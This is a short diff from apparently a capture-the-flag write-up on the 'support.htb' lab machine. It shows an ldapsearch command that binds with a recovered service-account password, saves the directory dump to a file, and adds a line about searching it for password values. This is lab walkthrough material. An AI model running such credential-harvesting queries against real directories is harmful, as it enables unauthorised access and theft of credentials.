@@ -179,4 +179,5 @@ This is the final value, but since this is running an ldap query using this stri
 ldapsearch -x -H ldap://10.129.230.181 -D "ldap@support.htb" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" | tee ldapsearch
 ```
 
-Now its in a file, ill open it in a text editor and 
+Now its in a file, ill open it in a text editor and looks for password values
+
